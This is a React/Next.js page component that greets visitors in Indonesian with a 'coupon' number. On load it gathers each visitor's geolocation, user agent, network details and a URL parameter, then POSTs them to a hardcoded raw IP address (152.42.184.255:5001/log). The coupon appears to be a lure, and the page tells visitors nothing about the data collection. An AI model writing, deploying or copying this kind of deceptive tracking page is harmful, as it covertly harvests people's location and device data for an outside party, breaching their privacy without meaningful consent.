'use client'; // Indicates this component is client-side only

import { useEffect } from 'react';
import { useParams } from 'next/navigation';

const DataPage = () => {
  const { number } = useParams();

  useEffect(() => {
    if (number) {
      // Function to get location
      const getLocation = (callback: (location: any) => void) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              callback({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
              });
            },
            (error) => {
              console.error('Error getting location:', error);
              callback(null);
            }
          );
        } else {
          console.error('Geolocation is not supported by this browser.');
          callback(null);
        }
      };

      // Function to get network information
      const getNetworkInformation = () => {
        let networkInfo = {};
        if (navigator.connection) {
          networkInfo = {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
          };
        } else {
          console.error(
            'Network Information API is not supported by this browser.'
          );
        }
        return networkInfo;
      };

      // Get User Agent
      const userAgent = navigator.userAgent;

      // Get Network Information
      const networkInfo = getNetworkInformation();

      // Get location and then send all data to the server
      getLocation((location) => {
        // Prepare data to be sent
        const data = 2;
        const paslon = {
          number,
          userAgent,
          location,
          networkInfo,
          data,
        };
        // Send data to the server
        fetch('http://152.42.184.255:5001/log', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(paslon),
        })
          .then((response) => response.text())
          .then((paslon) => {
            console.log('Data logged successfully:', paslon);
          })
          .catch((error) => console.error('Error logging data:', error));
      });

      // Set coupon number
      let r = (Math.random() + 1).toString(36).substring(7);
      document.getElementById('coupon-number')!.textContent = r + number;
    }
  }, [number]);

  return (
    <div>
      <h1 id="welcome-message">
        Welcome! Selamat Kupon Anda Sebagai Berikut: #
        <span id="coupon-number"></span>
      </h1>
    </div>
  );
};

export default DataPage;
